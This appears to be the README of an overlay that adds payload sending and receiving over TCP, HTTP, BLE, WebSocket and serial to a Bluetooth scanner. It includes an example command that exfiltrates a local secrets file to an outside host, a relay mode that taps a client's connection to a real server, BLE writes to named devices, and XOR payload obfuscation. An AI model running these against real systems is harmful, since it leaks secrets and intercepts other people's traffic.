# nightjar-hack

nightjar listens. This overlay gives it a mouth.

Two commands are added: `nightjar send` and `nightjar serve`. The first
pushes a payload out over the network or Bluetooth Low Energy. The second
catches payloads coming back. Nothing about the scanning path changes - the
receiver still never connects or pairs during a scan.

## Targets

| target | what it does |
| --- | --- |
| `tcp://host:port` | raw TCP; `--read` waits for a reply |
| `udp://host:port` | one datagram; `--read` waits for one back |
| `tcp+tls://host:port` | TLS-wrapped TCP |
| `http://` `https://` | any method via `--method`, headers via `--header` |
| `ble://` | advertise: a BLE beacon carrying your payload |
| `ble-gatt://` | a GATT server (peripheral) exposing the payload |
| `ble-write://ADDR` | central: connect to a peripheral and write a characteristic |
| `AA:BB:CC:DD:EE:FF` | a bare MAC is shorthand for `ble-write://` |
| `name:DEVICE` | resolve a peripheral by name, then write |

## Payloads

Exactly one source flag:

    --payload TEXT          utf-8 text
    --payload-hex HEX       hex bytes, colons/spaces/dashes tolerated
    --payload-b64 B64       base64
    --payload-file PATH     read the file as bytes
    --stdin                 read stdin

Transformations, applied before framing:

    --xor KEY               XOR the bytes with KEY (hex, or the text as utf-8)
    --gzip                  gzip first

## Framing

How the bytes sit on the wire, for network transports:

    --framing raw           (default) the bytes, exactly
    --framing len           4-byte big-endian length prefix, then the bytes
    --framing json          {"ts":...,"encoding":"base64","payload":"..."}

`serve` accepts `--framing` too, and unframes what arrives.

## Bluetooth, honestly

Three different roles, three different dependencies:

- `ble-write` uses **bleak**, which the scanner already depends on. This is
  the classic central role: find the device, connect, write a characteristic.
- `ble://` and `ble-gatt://` need **bless** (`pip install 'nightjar[tx]'`).
  This is the peripheral role: advertise, and optionally serve a readable,
  writable, notifiable characteristic. On Linux this needs BlueZ and root (or
  the Bluetooth capability), exactly like scanning does.

The advertised payload is also stamped into manufacturer data (company id
`0xFFFF` by default) and service data, where a passive nightjar on another
machine will see it in its own logs. bless's advertisement surface moves
between versions, so that stamping is best-effort and guarded.

## Recipes

Beacon, forever, until Ctrl-C:

    nightjar send ble:// --payload "nj-here" --name nightjar-post

A read/write GATT peripheral for a minute:

    nightjar send ble-gatt:// --payload "read me" --duration 60

Write to a peripheral by name:

    nightjar send name:AirPods --char 2a19 --payload "x"

Knock on a TCP port ten times, reading each reply:

    nightjar send tcp://10.0.0.5:9000 --payload "knock" --repeat 10 --interval 0.5 --read

Exfiltrate a file as a JSON envelope over HTTPS:

    nightjar send https://example.com/ingest --payload-file ./secrets.txt \
        --framing json --header "X-Post: laptop"

A two-way loop:

    nightjar serve --tcp 9000 --reply "ack" --out received.jsonl &
    nightjar send tcp://127.0.0.1:9000 --payload "tick" --read

Catch payloads on three ports and BLE at once:

    nightjar serve --tcp 9000 --udp 9001 --http 8080 --ble --out rx.jsonl

Look before you leap:

    nightjar send tcp://host:9000 --payload-hex deadbeef --xor 0x5a --gzip --dry-run

## More transports (2.4)

- `ws://host:port/path` / `wss://` — one WebSocket message per send;
  `serve --ws PORT` listens (`pip install websockets`, in the tx extra).
- `serial://DEVICE?baud=9600` — out a serial port, and
  `serve --serial DEVICE --baud 9600` listens on one (`pyserial`, tx extra).
  A payload ends at an idle gap, and the reply goes back down the wire.
- Several targets fan out: `nightjar send tcp://a:1 tcp://b:2 --payload x`,
  or comma-separated. The exit code is the worst target's.

## Send tricks

- `--expect TEXT` / `--expect-hex HEX` — read the reply and fail with
  exit 1 unless it contains the needle. A one-line smoke test.
- `--follow FILE` — send FILE's contents every time FILE changes.
- `--replay rec.jsonl [--speed 2]` — re-send a `serve --out` recording
  with its original timing (gaps capped at 10s; `--speed 0` = flat out).

## Serve tricks

- `--reply-mode echo` answers with the payload itself; `--reply-mode file
  --reply-file canned.bin` answers from a file; default `static` is the
  `--reply` text.
- `--relay tcp://real-server:port` (with `--tcp PORT`) taps a connection:
  clients talk to the real server through you, and both directions land
  in the sink as `relay-c2s` / `relay-s2c`.

## What changed in the checkout

- `nightjar/send.py` - new, the whole feature.
- `nightjar/cli.py` - an import, two names in `COMMANDS`, two subparsers, two
  handler entries, and one honest sentence in the description.
- `pyproject.toml` - an optional extra,
  `tx = ["bless>=0.2.0", "websockets>=12", "pyserial>=3.5"]`.
- `nightjar/__init__.py` - version to `4.0.0`.

No other file is touched. `apply_overlay.py --check` reports drift without
writing anything.

## The iOS app

`ios/` carries the same ideas as a native app: upstream nightjar's
listening post (with its Remote ID drone decoder), the mouth as
Send/Serve tabs, and a Scan tab of recon tools — connect scanner,
subnet sweep, observation feed, TLS inspector, DNS toolkit, pcap
dissector — plus fan-out, timed delivery, templating, SnatchSteal
and PayPlant on the send side. The Swift is a hand port, not
generated from send.py; this CLI remains the reference
implementation, and the app's feature manual is `ios/README.md`.

## Notes

- `send` is single-shot by default. `--repeat N` sends N times; `--duration S`
  keeps going for S seconds; `--repeat 0 --duration 300` is a five-minute beacon.
- `--json` turns results into one JSON object per line, for pipes.
- HTTP sends use `urllib` from the standard library - no `requests`.
- A `HEAD` or `GET` with a payload puts it in a `payload=` query parameter
  (base64), because there is no body to carry it.
- `serve` writes JSON Lines when `--out` is given, one record per payload,
  with both hex and base64 - the same spirit as nightjar's sighting log.
